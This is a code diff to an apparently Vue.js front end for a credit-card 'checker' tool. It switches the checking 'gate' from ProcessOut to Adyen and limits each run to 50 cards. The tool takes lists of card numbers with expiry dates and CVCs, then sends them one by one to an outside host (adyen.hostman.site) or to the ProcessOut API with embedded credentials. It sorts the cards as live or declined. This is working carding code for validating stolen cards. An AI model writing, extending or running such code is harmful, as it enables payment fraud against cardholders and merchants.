@@ -14,6 +14,10 @@
       <v-tab-item>
         <div class="px-5 pt-2 " style="height:85vh">
           <div class="pb-5">
+            <p>Current Gate : <span class="yellow--text">Adyen</span></p>
+            <p>You can check 50 cards per check in this gate!</p>
+          </div>
+          <div class="pb-5">
             <v-textarea
               solo
               :placeholder="cc"
@@ -40,14 +44,6 @@
             >
               Stop Checking
             </v-btn>
-            <v-select
-              :items="delays"
-              label="Choose Delay"
-              style="width:120px"
-              v-model="delay"
-              class="d-inline-block"
-              :disabled="loading2"
-            ></v-select>
           </div>
         </div>
       </v-tab-item>
@@ -228,10 +224,8 @@ export default {
       loading2: false,
       skcheck: false,
       switch1: false,
-      delays: ["0.2 second", "0.35 second", "0.5 second"],
-      delay: "0.2 second",
       noti: false,
-      notitext: "Your SK is Live",
+      notitext: "",
       noticolor: "success",
       ccs: "",
       sk: "",
@@ -287,13 +281,15 @@ export default {
         this.noti = true;
         return null;
       }
+      if (this.ccs.split("\n").length > 50) {
+        this.notitext = "Only 50 cards per check!";
+        this.noticolor = "error";
+        this.noti = true;
+        return null;
+      }
+
       this.loading2 = true;
-      let tmpdelay =
-        this.delay == "0.2 second"
-          ? 200
-          : this.delay == "0.35 second"
-          ? 350
-          : 500;
+      let tmpdelay = 5000;
       let checkInterval = setInterval(() => {
         if (this.ccs == "" || this.interuption) {
           this.loading2 = false;
@@ -301,50 +297,39 @@ export default {
           this.interuption = false;
         } else {
           let tmpcc = this.ccs.split("\n")[0];
-          this.processout(tmpcc);
+          this.adyen(tmpcc);
           this.deleteline();
         }
       }, tmpdelay);
     },
-    processout(cc) {
-      let data = {
-        name: "Gu Clan",
-        number: cc.split("|")[0],
-        exp_month: cc.split("|")[1],
-        exp_year: cc.split("|")[2],
-        cvc2: cc.split("|")[3],
-      };
+    adyen(cc) {
+      var data = JSON.stringify({
+        cc: cc,
+      });
 
       var config = {
         method: "post",
-        url:
-          "https://api.processout.com/cards?legacyrequest=true&project_id=proj_l5DZPqUJHdGdandtgOrAfvG2CTwWVMHX&x-Content-Type=application/json&x-API-Version=1.3.0.0&x-Authorization=Basic%20cHJval9sNURaUHFVSkhkR2RhbmR0Z09yQWZ2RzJDVHdXVk1IWDo=",
+        url: "https://adyen.hostman.site/cc",
         headers: {
           "Content-Type": "application/json",
         },
         data: data,
       };
 
-      axios(config).then(({ data }) => {
-        if (
-          data.card.cvc_check == "unavailable" &&
-          data.card.avs_check == "unavailable"
-        ) {
-          this.dead.push({
-            number: cc,
-            result:
-              "cvc_check: " +
-              data.card.cvc_check +
-              " avs_check: " +
-              data.card.avs_check,
-          });
-        } else {
-          this.livecvv.push({
-            number: cc,
-            result: data.card.cvc_check,
-          });
-        }
-      });
+      axios(config)
+        .then((res) => {
+          if (res.data.Status == "Refused") {
+            this.dead.push({
+              number: cc,
+              result: "Declined > " + res.data.Reason,
+            });
+          } else {
+            this.dead.push({ number: cc, result: res.data });
+          }
+        })
+        .catch((error) => {
+          console.log(error);
+        });
     },
   },
 };
